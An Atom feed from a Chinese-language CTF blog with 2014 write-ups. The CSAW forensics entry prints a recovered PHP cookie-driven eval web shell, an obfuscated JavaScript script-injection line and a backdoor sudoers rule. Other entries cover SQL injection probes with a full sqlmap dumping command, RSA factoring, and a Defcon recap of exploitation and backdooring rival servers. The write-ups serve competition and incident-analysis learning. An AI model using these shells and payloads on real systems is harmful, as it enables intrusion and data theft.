<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Ctf | Jeffxx Blog]]></title>
  <link href="http://jeffxx.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://jeffxx.github.io/"/>
  <updated>2014-09-24T22:35:12+08:00</updated>
  <id>http://jeffxx.github.io/</id>
  <author>
    <name><![CDATA[cychao]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[CSAW CTF 2014 Forensics 300 Fluffy No More Write-up]]></title>
    <link href="http://jeffxx.github.io/blog/2014/09/24/csaw-ctf-2014-forensics-300-fluffy-no-more-write-up/"/>
    <updated>2014-09-24T21:15:06+08:00</updated>
    <id>http://jeffxx.github.io/blog/2014/09/24/csaw-ctf-2014-forensics-300-fluffy-no-more-write-up</id>
    <content type="html"><![CDATA[<p><img src="/images/writeup/csaw2014_taskboard.png"></p>

<p>最近實在太忙了,請容許我的 Defcon 下集繼續拖稿, 趁剛打完 CTF 記憶猶新先寫write-upXD</p>

<p>CSAW CTF 是給大學生打的CTF, 只允許純大學生的隊伍參加決賽,冠軍獎金不少,吸引了不少強者參加.
一年之中最適合初學者參加的CTF非他莫屬, 題目平易近人,就算只會google也可以拿到幾百分.</p>

<p>本次 Write-up 選擇 Foensics 300 , 除了題目設計的很像真實發生的資安事件外, 最重要的是我們在最後一步卡了四五個小時, 必須好好記錄下來避免再次犯錯.</p>

<!--  more -->


<p><img src="/images/writeup/csaw2014_f300.png">
<a href="https://github.com/ctfs/write-ups/tree/master/csaw-ctf-2014/fluffy-no-more">題目備份</a></p>

<p>大意就是有個人的網站被駭了,許多該網站的使用者受到影響,站長已經將 伺服器的設定檔(/etc),網站(web root directory), 日誌 (/var/log) , 資料庫 (sql)
全部備分出來,請你協助調查發生了什麼事情.</p>

<p>做這種事件調查時, 幾個資訊要先釐清 發生的大概時間, 攻擊來源, 影響範圍等. 遺憾的是真的發生事件時這些重要資訊大概都沒有,跟題目一樣(汗)</p>

<p>因此我從 http access log 看起 , 濾掉 404  , css , js 的 query . 再檢查一下 useragent 會發現有幾個大量使用 scanner 的 IP , 但都不是我們要找的目標.</p>

<p>此時atdog直接去翻網頁目錄, 看到是wordpress就直接往 plugin / upload 找,直接就找到後門.</p>

<p><img src="/images/writeup/csaw2014_f300_backdoor.png"></p>

<p>事後我們猜測這邊應該是要先去看wordpress用的plugin,會看到 wysija  然後google wysija exploit會找到 <a href="http://www.exploit-db.com/exploits/33991/">任意檔案上傳漏洞</a> , 從攻擊payload裡面可以抓出特徵,再去log裡面找到攻擊者IP及上傳的後門</p>

<p><img src="/images/writeup/csaw2014_f300_exploit.png"></p>

<p>回歸正題, backdoor 被混淆過,簡單把最後一行的最外層變數改成echo就可以拿到最後執行的php command</p>

<p>```php
$c=&lsquo;count&rsquo;;
$a=$_COOKIE;
if(reset($a)==&lsquo;ha&rsquo; &amp;&amp; $c($a)>3){</p>

<pre><code>  $k='ckit';echo '&lt;'.$k.'&gt;';
  eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
  echo '&lt;/'.$k.'&gt;';
</code></pre>

<p>}
<code>
由於駭客很賤的把命令藏在cookie裡, 所以無法從log還原出下的指令, 只能根據時間去檢查系統設定檔修改時間. 很幸運的我們有整個/etc, 有正確的時間點我們很快找出被駭客動過的檔案, 用IP去grep log也會看到很多嘗試登入系統的動作.
</code></p>

<h1>cat etc/sudoers.d/casper</h1>

<p>ubuntu  ALL=(ALL) NOPASSWD: ALL
```</p>

<p>看到這邊再回頭看auth.log就會發現那一系列的sudo command有部分應該是hacker下的, 其中一行vi html5.js特別可疑
```</p>

<h1>cat auth.log  | grep vi</h1>

<p>Sep 17 17:17:51 ubuntu sudo:   ubuntu : TTY=unknown ; PWD=/ ; USER=ubuntu ; COMMAND=/usr/bin/gsettings get org.gnome.nautilus.desktop volumes-visible
Sep 17 17:17:59 ubuntu sudo:   ubuntu : TTY=unknown ; PWD=/ ; USER=ubuntu ; COMMAND=/usr/bin/gsettings set org.gnome.nautilus.desktop volumes-visible false
Sep 17 17:18:08 ubuntu gnome-keyring-daemon[4914]: couldn&rsquo;t set environment variable in session: Setenv interface is only available during the Initialization phase
Sep 17 17:22:19 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt-get install lamp-server^ vim
Sep 17 17:24:52 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/vi /etc/hosts
Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
```
去將原版twentythirteen的html5.js抓下來比對會發現多一行:</p>

<p><code>
if(g)return a.createDocumentFragment();for(var b=b||i(a),c=b.frag.cloneNode(),d=0,e=m(),h=e.length;d&lt;h;d++)c.createElement(e[d]);return c}};l.html5=e;q(f)})(this,document); var g="ti";var c="HTML Tags";var f=". li colgroup br src datalist script option .";f = f.split(" ");c="";k="/";m=f[6];for(var i=0;i&lt;f.length;i++){c+=f[i].length.toString();}v=f[0];x="\'ht";b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f="";c=c.split("");var w=0;u="s";for(var i=0;i&lt;c.length;i++){if(((i==3||i==6)&amp;&amp;w!=2)||((i==8)&amp;&amp;w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];} i=k+"anal"; document.write("&lt;"+m+" "+b+"="+x+"tp:"+k+k+f+i+"y"+g+"c"+u+v+"j"+u+"\'&gt;\&lt;/"+m+"\&gt;");
</code></p>

<p>直接丟進瀏覽器的開發者工具執行,會被導到一個 <a href="http://128.238.66.100/announcement.pdf">PDF</a>  然後我們用pdfdump, hexedit, 010edit都看不出個所以然,回頭又繼續翻log. 找各種蛛絲馬跡.</p>

<p>浪費了幾個小時,還一度以為右下角的imgurl是線索,要去imgurl找出作圖的作者.最後發現是 pdfdump -raw的output不會decode,用pdfdump -b -i 8 就直接看到javascript跟key了&hellip;</p>

<p>CTF結束後看別人的 <a href="https://github.com/ctfs/write-ups/tree/master/csaw-ctf-2014/fluffy-no-more">Write-up</a> , <a href="http://sandsprite.com/blogs/index.php?uid=7&amp;pid=57">PDF streaming dump</a> 比 <a href="http://www.unixuser.org/~euske/python/pdfminer/">dumppdf</a>更強大,要學起來.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Defcon 22 Final HITCON 參賽心得 (上)]]></title>
    <link href="http://jeffxx.github.io/blog/2014/08/13/2014-defcon-22-final-can-sai-xin-de-shang/"/>
    <updated>2014-08-13T09:50:15+08:00</updated>
    <id>http://jeffxx.github.io/blog/2014/08/13/2014-defcon-22-final-can-sai-xin-de-shang</id>
    <content type="html"><![CDATA[<p>  <img src="/images/defcon22_final/captain_token.jpg"></p>

<p> 寫作能力不佳,平常只寫技術文章,不是很敢寫心情抒發之類的東西
 但這次太不一樣了,決定嘗試一下.</p>

<p> 感謝超罩的隊友們 :
 Orange Sean Jery Peter Shik atdog dm4 lucas ddaa</p>

<p>感謝 Alan, TT , GD , Kenny, Turkey 四處奔走 在拉斯維加斯幫我們打理食衣住行</p>

<p>感謝趨勢贊助旅費讓我們可以成行.</p>

<p> 比賽時忘記拍照, 感謝 <a href="http://blog.orange.tw">Orange</a> 友情提供照片.</p>

<!-- more -->


<hr />

<p>   在心得開始前先說明一下什麼是 Attack &amp; Defense.</p>

<p>   主辦單位會為所有參加的隊伍準備需要守護的伺服器 &ndash; gamebox ,
   這檯伺服器上提供數種服務,會有網頁, 遊戲或其他特殊用途的Server 等等.
   每個服務都有數個漏洞,漏洞可能只是簡單的資訊泄露, 阻斷服務;
   也可能是一個嚴重的漏洞讓客戶端可以在伺服器上執行任意指令.</p>

<p>   參賽的隊伍需要做的事情就是守護好自己的伺服器,打爆別人的.
   守護好自己的伺服器,正常提供服務.
   若服務沒有正常運作,每一回合(5分鐘) -19分,扣的分數平均分配給服務正常的隊伍.
   而正常運作的服務因為有漏洞的關係,很可能被其他隊伍利用來偷取伺服器上的檔案 &ndash; token.
   只要被搶走token, 該回合扣19分, 搶走token的隊伍平分.</p>

<p>   每種服務獨立計算,所以如果同時四個服務都被打穿,一回合會掉76分&hellip;
   去年很多隊伍打到第二天分數被搶光光,好不容易搶到一些分數卻又馬上被搶走,第二天下午就棄權了</p>

<hr />

<p> 一開賽,我們就照前一天的演練迅速將防禦程式放到Gamebox上,
 誰知第一回合馬上被主辦單位判定服務不正常, 與其他五隊一起被扣了19分.
 開局就失分, 士氣大受打擊, 在沒有經驗的情況下,
 連續掉了四回合的分數才止住失分,</p>

<p><strong> 開賽20分鐘, HITCON墊底 ,還放棄了數道217準備許久的防線. </strong></p>

<p> 保持墊底一段時間後,總算在第一支服務(Eliza)的程式分析有了進展</p>

<p> <img src="/images/defcon22_final/eliza_vulnerability.png">
 找到兩個漏洞 information leak 與 stack overflow,
 先透過 information leak 的漏洞leak出函式的位置.
<code>因為伺服器啟動了ASLR, 每次執行程式的函式位置都不一樣</code></p>

<p> 再來就可以利用stack overflow的漏洞控制程式執行流程.
 在這邊我們犯了一個錯誤,看到有ASLR,就以為也有DEP的保護,
 就花了很多時間在建構ROP, 想繞過DEP的保護.
 <code>DEP: Data Execution Prevention, 禁止在data段執行指令</code></p>

<p> 先弄第一段ROP,取得函式庫的記憶體位置,再建第二段ROP跳轉到C libary 的system執行指令.
 但在Sean成功寫出exploit之前,已有其他隊伍率先寫出並開始攻擊所有隊伍,
 發現token泄露之後 Jery在兩回合內將我們找出的弱點補上.</p>

<p> 而我在分析流量時,一直無法從payload裡面找到ROP,
 放棄找ROP之後才發現一個讓我吐血的事情,
 <strong> Eliza </strong> 用qemu-i386跑起來時不知道為何沒有DEP,直接只蓋EIP 2byte 跳一個ROP gadge去執行stack上的shellcode就可以執行任意指令了
 . 同時也發現不到半小時已有部分隊伍根據第一隊的思路寫出exploit.
 <code>其他隊伍也有可能是replay封包 賭那1/16 ASLR分配到相同位置的機率</code></p>

<p> 但直到Sean寫出ROP版本的exploit,開始攻擊其他隊伍的時候,還是有近半數的隊伍沒有修補好漏洞,瞬間搶到很多token.
 Peter和Shik將攻擊自動化之後,Orange還加進了後門程式,就算對方已修補漏洞,只要沒有被發現後門,
 我們還是能取得對方的token,靠這招打一次偷好幾次XD</p>

<p>   第二個服務是一個web server, 我們一直沒有投入人力下去看,
   不過我們在分析封包時有找到其他隊伍的攻擊payload,透過重放攻擊也有取得部分隊伍的token.</p>

<p>   過了平靜的幾個小時,突然間發現修補好漏洞的Eliza開始掉分,原以為是patch失效,
   抓出攻擊流量一看差點暈倒, 有隊伍找到了一個很難觸發的弱點,寫出了成功率很高的攻擊程式.</p>

<p>   Eliza是一個類似大航海的宇宙經營遊戲,遊戲一開始會有一萬元跟一萬單位油,
   每個星球賣跟買的東西與價錢都不一樣,要引發這個漏洞的前提是要賺進大量的金錢,
   買不同物品買到超過程式分配的大小,也會造成Stack overflow,
   新買的物品數量會蓋到其中一個函式的指標,靠著物品數量控制程式執行流程,
   這個漏洞花了兩位ACM World final一個下午加晚上的時間寫出賺錢程式觸發漏洞.</p>

<p>   第一天結束時我們隊伍排在第五,猜測是因為前面服務沒有正常運作被扣了太多分.
   草草吃了晚餐,開始討論第二天戰術及晚上工作 # 忘記當天吃什麼了, 比賽只要一開始大家都會忘記吃東西
   <code>Shik打開麵包咬著開始寫code寫到過了20分鐘都沒發現</code></p>

<p>   第二天一早進去,驚喜地發現我們排在第二名,與第一名的差距也縮短到一千分以內
   原來是主辦單位算分程式有bug, 扣一次分會變扣兩次分, 連夜修正回來
  <img src="/images/defcon22_final/day2_scoreboard.jpg"></p>

<p>   比賽開始後就按照吃早餐時討論的工作分配, 第二天的是沒有計分板的,內網的計分板只有名次
   大螢幕上一個戰場圖顯示目前各隊互相攻擊的狀況,
   我們坐在邊邊就得輪流去看伺服器有沒有被攻擊成功,上的防禦如何上
   上的防禦有沒有效, 看到一半赫然發現我們變成第一名了!!!!!!!!!!!!!</p>

<p>  <img src="/images/defcon22_final/day2_1st_scoreboard.png"></p>

<p>   大家都傻住了,莫名其妙就爬到第一名,第一天晚上還在想不能被剃光頭..
   整個落差有點大</p>

<p>   先寫到這邊,留在最開心的時候&hellip;</p>

<hr />

<p><strong>補充: </strong></p>

<ul>
<li><p>很多細節和時間順序已經想不起來了,是憑印象亂湊的XD</p></li>
<li><p>八個人同時要做:
&ldquo;監控伺服器狀態,檢查流量,分析程式,發動攻擊,啟動防禦,漏洞修補,重放其他隊的攻擊&rdquo;.
工作很多很雜,團隊能不能好好的分工很重要,幸好我們平時有一起CTF練默契.否則會死得很慘</p></li>
<li><p>雖然三天加起來可以互相打的時間大概是24小時,
但現場這24小時壓力非常大,發現分數掉要等十五分鐘才拿的到封包流量來分析,
拿到之後要分析攻擊,找漏洞,修補,同時token還是一直往外噴,
每晚五分鐘就多噴19分,都是拼了命想辦法在第一時間搞定.
在這樣的壓力下體力消耗得很快,
到晚上八點賽程結束後還要離線分析.想辦法做出攻擊payload,結果第一天寫到一半就躺成這樣了&hellip;.</p></li>
</ul>


<p>  <img src="/images/defcon22_final/day1_sleep.jpg"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Defcon 22 Qual Sick Writeup]]></title>
    <link href="http://jeffxx.github.io/blog/2014/05/19/defcon-ctf-22-qual-sick-writeup/"/>
    <updated>2014-05-19T19:24:00+08:00</updated>
    <id>http://jeffxx.github.io/blog/2014/05/19/defcon-ctf-22-qual-sick-writeup</id>
    <content type="html"><![CDATA[<p>Defcon CTF Qual 一直都是一年中競爭最激烈的比賽. 全世界一千多個隊伍搶12個決賽名額,
搶到門票的12隊加上8個種子隊(去年Defcon final冠軍, 七個世界各地CTF冠軍隊伍)
會在 8/7~ 8/10 於拉斯維加斯進行更刺激的 Attack &amp; Defense 決賽.</p>

<hr />

<p>這次與217,Chroot和lab成員奮鬥48小時,在剩下六小時的時候掉出20名外,</p>

<p>還好在最後一小時解出四分題,驚險奪得Defcon決賽門票</p>

<p><img src="/images/writeup/defcon22_scoreboard.PNG"></p>

<p>這題靠整個團隊的合作在一小時內快速解出, 實在太值得紀念. 故本次選擇寫這題的writeup</p>

<!-- more -->


<ul>
<li><strong>Category:</strong> HJ</li>
<li><strong>Points:</strong> 4</li>
<li><strong>Description:</strong></li>
</ul>


<blockquote><p>I am sorry Sick Yoda.
<a href="comeandgetme.enc_99509db93ee7ef2ee463df934c2c027a">services.2014.shallweplayaga.me/comeandgetme.enc_99509db93ee7ef2ee463df934c2c027a</a>
<a href="pub.pem_c5ea59f35d1b7ebf6e9f140144c2a2b8">services.2014.shallweplayaga.me/pub.pem_c5ea59f35d1b7ebf6e9f140144c2a2b8</a></p></blockquote>

<p>題目一開始給了一個RSA public key和一個加密檔</p>

<p><code>
-----BEGIN PUBLIC KEY-----
MEEwDQYJKoZIhvcNAQEBBQADMAAwLQImC1+CPNtJhcI2UiY7iabqbVRDkz0le0uq
dgc87QWlj7qE+QS9LTcCAwEAAQ==
-----END PUBLIC KEY-----
</code></p>

<p>可以看到RSA KEY只有308 bits, 貌似可以很快爆出p,q</p>

<p>剛好在某次CTF解過類似的題目,立刻把當時參考的資料拉出看</p>

<blockquote><p><a href="http://m0x39.blogspot.tw/2012/12/0x00-introduction-this-post-is-going-to.html">http://m0x39.blogspot.tw/2012/12/0x00-introduction-this-post-is-going-to.html</a></p></blockquote>

<p>atdog用pkcs1-conf拉出 n, 送到網站上解不出p,q</p>

<p><code>n=1447960949958180889766108699794255593190305412016955260539401755003594509743125280111537463</code></p>

<p>此時所有人各自找library/程式嘗試暴力破出p,q</p>

<p>最後Shik 使用 <a href="http://yafu.sourceforge.net/">Yafu</a> 在 328.0232 秒後破出了 p , q</p>

<p><code>p=1155392895670976232909180918778240881689447939</code>
<code>q=1253219537166446194660024618758541358223427517</code></p>

<p>丟進rsatool 找出d</p>

<p>```
rsatool.py -e 65537 \</p>

<pre><code>       -p 1155392895670976232909180918778240881689447939 \
       -q 1253219537166446194660024618758541358223427517 \
       -n 1447960949958180889766108699794255593190305412016955260539401755003594509743125280111537463 
</code></pre>

<p><code>``
</code>d=102ddee9144c93aca5fa57c97b19a985beca22a2c3b7ede3db15fec4c24969f337cca2bf069`</p>

<p>得到d之後就可以直接解密comeandgetme.enc</p>

<p>```</p>

<h1>cat comeandgetme.enc_99509db93ee7ef2ee463df934c2c027a \</h1>

<pre><code>    | rsacrack.py -d 102ddee9144c93aca5fa57c97b19a985beca22a2c3b7ede3db15fec4c24969f337cca2bf069 \
    b5f823cdb4985c23652263b89a6ea6d5443933d257b4baa76073ced05a58fba84f904bd2d37 \
    | strings
</code></pre>

<p><a href="http://bit.ly/1jANwVx">http://bit.ly/1jANwVx</a>
```</p>

<p>從網址抓到一個mp3檔,所有人都聽了口音很重的英文15分鐘,發現最後一段有連續的雜訊</p>

<p>用goldwave分析雜訊的部分</p>

<p><img src="/images/writeup/defcon22_sick_noise.PNG">
<img src="/images/writeup/defcon22_sick_noise_zoomin.PNG"></p>

<p>頻譜看起來有點奇怪,猜測是要將粗的看成0,細的看成1</p>

<p>decode的方法有機會是moorse或是ascii binary</p>

<p>在這邊分頭進行解碼, moorse decode失敗</p>

<p>當成ascii binary時decode前面10幾個bytes都是printable字元,</p>

<p>但只看前幾bytes看不出是什麼encode</p>

<p>遠在北京的 Shik 不曉得用什麼神奇的方法快速解出所有bytes
<code>
7rKM^ATVEq+D&gt;k=E-"&amp;n06:]FG%kGtF"T4%0f1M(BOP^nG@b`0@&lt;l9o@4lD.04o$/B4!SU@:j+-AM@XR2e"R&amp;3A&lt;-q2E#,&amp;2)[EQAS,O_AnE/oDIal'FEDJC3\N.-ATDs.@qB^61,(F&gt;/ot]7Ci"&lt;,E,8s.@:s"$D.PA3D.R'01LsuL2E*EJ3&amp;3KN0K1gK1b^jsA2lJ%3FOa!0On
</code></p>

<p>這串字困擾了我們許久, 嘗試了各種常見的encode:  caser, xor , uuencode &hellip;.. 都失敗</p>

<p>最後還是shik發現是ascii85 encode, decode解出兩個url</p>

<p><code>http://services.2014.shallweplayaga.me/flag_76aff3e0d77b38900a66e35687effaff</code>
<code>http://services.2014.shallweplayaga.me/eme_23dc0673382940749407ad8619a41</code></p>

<p>第一個連結是被加密過的flag, 第二個連結看起來少了3bytes, Orange寫了隻script爆出最後3byte</p>

<p><code>http://services.2014.shallweplayaga.me/eme_23dc0673382940749407ad8619a410cc</code></p>

<p>抓下來是隻elf x64, 只有encrypt功能</p>

<p>所有人分頭reverse binary和直接執行觀察encrypt的方式</p>

<p>最後得出結論是block encrypt, 4bytes 結果不互相影響</p>

<p>Orange用"The flag is:&ldquo; encrypt與flag 比較 確定前八碼相同</p>

<p>然後討論如何暴力跑出flag,</p>

<p>由 Sean 提出了非常快速的方法, 先將所有可能的4字元組合產生出字典檔</p>

<p>再將字典檔用給的程式加密 比對是否有與flag相符的4bytes , 再從字典檔拉出相同位置的明文</p>

<p>這邊大家各自寫程式gen, 我偷懶的用maskprocessor ,
maskprocessor產生組合字串很快而且很好設定規則
```</p>

<h1>maskprocessor -o /tmp/dict &mdash;increment-min=4 &mdash;increment-max=4 -1 ?l?u?d?s ?1?1?1?1</h1>

<p>```</p>

<p>但剛開始學python寫太慢, 最後是orange的script爆出flag.</p>

<p><code>python
ok
0 ['fa\xb2\xc0'] The
4 ['K\x16\xf4\x11'] flag
8 ['\n-2F'] is:
12 ['\xd9\xcb\x8d\x9d'] I h
16 ['k\x88rP'] ope
20 ['\xe4\x83w\r'] that
24 ['\xe5\xb1\xd8\x14'] did
28 ['\xc22H\x02'] n't
32 ['T\xa1\xa4\x92'] suck
36 ['abW\x95'] too
40 ['5\x94\x13\x92'] muc
44 ['[\x0f\x84\xaa'] 44 keyerror
</code></p>

<p><code>The flag is: I hope that didn't suck too muc</code></p>

<p>最後4bytes因為換行字元與null bytes不在orange的字典清單裡所以match不到</p>

<p>Orange直接猜 <code>I hope that didn't suck too much.</code> 4分GET</p>

<p>// 所有人一起解出關鍵題目的感覺真棒! 紀念一下(L)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PlaidCTF Forensics 400 ZFS Write-up]]></title>
    <link href="http://jeffxx.github.io/blog/2014/04/16/plaidctf-forensics-400-zfs-write-up/"/>
    <updated>2014-04-16T21:04:29+08:00</updated>
    <id>http://jeffxx.github.io/blog/2014/04/16/plaidctf-forensics-400-zfs-write-up</id>
    <content type="html"><![CDATA[<p>這次與217 Orange 組隊打 PlaidCTF 靠超強隊友拿到第五名</p>

<p>記分板非常華麗, 滑鼠移過去可以看到各題型即時統計,得分狀況 很特別的設計.
現在好像還看的到  有興趣的可以看一下</p>

<p><a href="http://play.plaidctf.com/scoreboard">http://play.plaidctf.com/scoreboard</a></p>

<p><img src="/images/writeup/plaidctf2014_problemboard.png"></p>

<p><img src="/images/writeup/plaidctf2014_scoreboard.png"></p>

<p>PPP出的題目非常棒, 像是:</p>

<blockquote><p>二次汙染的 Blind SQL injection &ndash; <a href="https://github.com/ctfs/write-ups/tree/master/plaid-ctf-2014/whatscat">WhatsCat</a></p>

<p>從 Memoery dump 挖出 master secret key 解 https &ndash; <a href="https://github.com/ctfs/write-ups/tree/master/plaid-ctf-2014/curlcore">Curlcore</a></p>

<p>跟上潮流的 <a href="https://github.com/ctfs/write-ups/tree/master/plaid-ctf-2014/heartbleed">Heartbleed</a></p>

<p>被埋後門的 <a href="https://github.com/ctfs/write-ups/tree/master/plaid-ctf-2014/gcc">GCC</a></p>

<p>要改Return address 或 GOT entry的 python jail &ndash; <a href="https://github.com/ctfs/write-ups/tree/master/plaid-ctf-2014/nightmares">Nightmares</a></p>

<p>只剩下3成的RSA key reconstruction &ndash; <a href="https://github.com/ctfs/write-ups/tree/master/plaid-ctf-2014/rsa">RSA</a></p></blockquote>

<p>不過沒有那麼多時間可以寫write-up , 只能寫一篇,
挑一個解最久的題目zfs來寫XD</p>

<p>這題是跟atdog一起解的,前面卡關卡很久,
最後atdog用人眼讀zfs data structure把key看出來</p>

<p>&hellip;&hellip;..未完待續</p>

<p>// 我承認我只是想先曬計分板(被毆飛</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2014 Web300 Write-up]]></title>
    <link href="http://jeffxx.github.io/blog/2014/03/23/backdoor-ctf-2014-web300-write-up/"/>
    <updated>2014-03-23T13:47:44+08:00</updated>
    <id>http://jeffxx.github.io/blog/2014/03/23/backdoor-ctf-2014-web300-write-up</id>
    <content type="html"><![CDATA[<p>這次CTF不難  早上11:00開始玩到晚上12:00時已經差三題全解,
後來 Orange 出手成績直接爆表</p>

<p><img src="/images/writeup/backdoor2014_scoreboard.PNG"></p>

<p>有趣的是主辦單位在規則上寫說:</p>

<blockquote><p>The competition requires you to find flags to gain points. Some flags can be gained by completing tasks, others are hidden in different places.</p></blockquote>

<p>這不是讓大家去打網站嗎OTZ&hellip;.</p>

<p>當時整個網頁都翻過之後才看到IRC上說hidden flag總共四把
<em>其實我很想寫第五把hidden flag的write up,但是好像要先問過人家願不願意被公開(flee</em></p>

<p>總之在一般的題目裡,值得寫writeup的只有web300</p>

<!-- more -->


<p>直接看題目</p>

<blockquote><p>H4x0r is making a new website and has decided to give you beta access! Head over here to register.</p></blockquote>

<p>網頁連進去後有register, status, login三個頁面</p>

<p><img src="/images/writeup/backdoor2014_w300_register.PNG"></p>

<p><img src="/images/writeup/backdoor2014_w300_status.PNG"></p>

<p>其中有問題的是 status.php</p>

<p>輸入存在的使用者會</p>

<p><img src="/images/writeup/backdoor2014_w300_status_valid.PNG"></p>

<p>不存在時</p>

<p><img src="/images/writeup/backdoor2014_w300_invalid.PNG"></p>

<p>這個頁面存在 boolean-based sql injection  簡單用一對一錯的sql injection試一下就知道</p>

<p><code>sql
' or 1='1
' and 2='1
</code></p>

<p>知道是boolean-based的sql injection 直接拿sql map出來跑</p>

<p>這邊一定要提一下Atdog前面解w100時(也是bool sql injection)靠北了一句話</p>

<blockquote><p>我還是第一次看到ctf的題目 sqlmap可以直接爆的</p></blockquote>

<p>不過這題是三百分,有擋工具 如果使用工具的話會被偵測出來</p>

<p><img src="/images/writeup/backdoor2014_w300_status_block.PNG"></p>

<p>在這邊就做了一些猜測,  是檢查 user-agent? IP bind cookie? frequency rate?</p>

<p>最後發現status頁面會 set cookie,  post過去的頁面會delete cookie.</p>

<p>cookie只能用一次,且鎖php session</p>

<p><img src="/images/writeup/backdoor2014_w300_status_setcookie.PNG"></p>

<p>這時就會發現SQLmap真的很強大, 可以自訂每次request 前執行的動作 修改每次的cookie/parameter</p>

<p><img src="/images/writeup/backdoor2014_sqlmap_eval_usage.PNG"></p>

<p>而eval修改cookie的功能是去年加上去的</p>

<p><img src="/images/writeup/backdoor2014_sqlmap_not_suppot_cookie.PNG"></p>

<p><img src="/images/writeup/backdoor2014_sqlmap_eval_cookies.PNG"></p>

<p>最後就是用sqlmap eval 去讀status.php取得cookie  就可以爆db了</p>

<p><code>python
import requests;
web_300_token=requests.get('http://backdoor.cognizance.org.in/problems/web300/status.php',headers={'User-Agent': 'SQLI'},cookies=dict(PHPSESSID='s60g4fnru4scvr8agl7rvnaji4')).cookies['web_300_token']
</code></p>

<p>值得注意的是sqlmap跟status要用同一組php session key 不然還是會錯.</p>

<p>Payload
```console
sqlmap -u <a href="http://backdoor.cognizance.org.in/problems/web300/check.php">http://backdoor.cognizance.org.in/problems/web300/check.php</a> \</p>

<pre><code>       --data="username=a" --string="This user has been validated"\
       --cookie="web_300_token=25b71a45869d38c2a509116149245865;  \
       PHPSESSID=s60g4fnru4scvr8agl7rvnaji4" \
       --user-agent="SQLI" \
       --referer="http://backdoor.cognizance.org.in/problems/web300/status.php" \
       --eval="import requests;\
               web_300_token=requests.get('http://backdoor.cognizance.org.in/problems/web300/status.php',\
               headers={'User-Agent': 'SQLI'},\
               cookies=dict(PHPSESSID='s60g4fnru4scvr8agl7rvnaji4')).cookies['web_300_token']"
</code></pre>

<p>```</p>

<p>相關參數
<code>console
-u url
--data Post的資料
--string SQL指令執行是true web會回傳的關鍵字
--not-string SQL指令執行是false web會回傳的關鍵字
--cookie 指定cookie
--user-agent 指定user agent
--referer 指定ref page
--eval 每次request前須執行的指令
</code>
撈資料
<code>console
--users 撈db帳號
--databases 撈db
--tables 撈table , 可用-D 指定database
--columns 撈欄位 , 可用-T 指定table
--dump 撈資料, 要用-C 指定欄位 -T 指定table
--dump-all 撈所有資料 再bool-based底下會很慢
--threads 指定同時run幾隻 加快速度
</code></p>
]]></content>
  </entry>
  
</feed>
